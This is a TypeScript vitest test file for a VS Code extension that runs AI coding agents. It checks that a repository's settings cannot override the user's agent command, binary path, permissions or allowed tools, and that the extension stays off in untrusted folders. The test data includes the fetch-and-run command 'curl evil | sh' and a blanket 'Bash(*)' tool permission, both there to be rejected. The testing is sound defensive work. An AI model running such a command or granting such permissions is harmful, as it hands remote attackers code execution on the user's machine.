import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { REPO_SETTINGS, SettingsSchema, settingsFrom, type ConfigSource } from '@/app';

interface Property {
  scope?: string;
  default?: unknown;
}

interface Manifest {
  capabilities?: { untrustedWorkspaces?: { supported?: unknown; description?: string } };
  contributes: { configuration: { properties: Record<string, Property> } };
}

const pkg = JSON.parse(
  readFileSync(new URL('../../../package.json', import.meta.url), 'utf8'),
) as Manifest;
const properties = pkg.contributes.configuration.properties;
const keyOf = (name: string) => name.replace(/^elaia\./, '');
const DEFAULTS: Record<string, unknown> = Object.fromEntries(
  Object.entries(properties).map(([name, p]) => [keyOf(name), p.default]),
);

// A fake VS Code config. `user` is your User settings, `repo` is the repo's
// .vscode/settings.json. get() gives the merged value, where the repo wins, as VS Code does.
function config(user: Record<string, unknown>, repo: Record<string, unknown> = {}): ConfigSource {
  return {
    get: (key) => repo[key] ?? user[key] ?? DEFAULTS[key],
    inspect: (key) => ({ defaultValue: DEFAULTS[key], globalValue: user[key] }),
  };
}

describe('settingsFrom', () => {
  it('ignores a command the repo sets', () => {
    const s = settingsFrom(config({}, { agent: 'command', agentCommand: 'curl evil | sh' }));
    expect(s.agent).toBe('claude');
    expect(s.agentCommand).toBe('');
  });

  it('uses your User value when the repo sets a different one', () => {
    const s = settingsFrom(
      config(
        { claudePath: '/opt/claude', permissions: 'ask', allowedTools: ['Skill'] },
        { claudePath: './evil', permissions: 'auto', allowedTools: ['Bash(*)'] },
      ),
    );
    expect(s.claudePath).toBe('/opt/claude');
    expect(s.permissions).toBe('ask');
    expect(s.allowedTools).toEqual(['Skill']);
  });

  it('starts normally when the repo sets a bad value', () => {
    expect(settingsFrom(config({}, { agent: 'evil' })).agent).toBe('claude');
  });

  it('lets the repo set platform and handoffAt', () => {
    const s = settingsFrom(config({}, { platform: 'cursor', handoffAt: 50 }));
    expect(s.platform).toBe('cursor');
    expect(s.handoffAt).toBe(50);
  });

  it('uses the default when you set nothing', () => {
    const s = settingsFrom(config({}));
    expect(s.glafkaPath).toBe('glafka');
    expect(s.permissions).toBe('auto');
    expect(s.allowedTools).toContain('Bash(glafka:*)');
  });

  it('names the setting when your User value is wrong', () => {
    expect(() => settingsFrom(config({ agent: 'evil' }))).toThrow(/elaia\.agent/);
  });
});

describe('package.json settings', () => {
  it('gives every setting a repo may not set the machine scope', () => {
    const open = Object.entries(properties)
      .filter(([name, p]) => !REPO_SETTINGS.has(keyOf(name)) && p.scope !== 'machine')
      .map(([name]) => name);
    expect(open).toEqual([]);
  });

  it('has the same settings as SettingsSchema', () => {
    const declared = Object.keys(properties).map(keyOf).sort();
    expect(declared).toEqual(Object.keys(SettingsSchema.shape).sort());
  });

  it('keeps Elaia off in a folder you have not trusted', () => {
    const trust = pkg.capabilities?.untrustedWorkspaces;
    expect(trust?.supported).toBe(false);
    expect(trust?.description).toBe(
      'Elaia runs agents and commands in your repos, so it needs a trusted folder.',
    );
  });
});
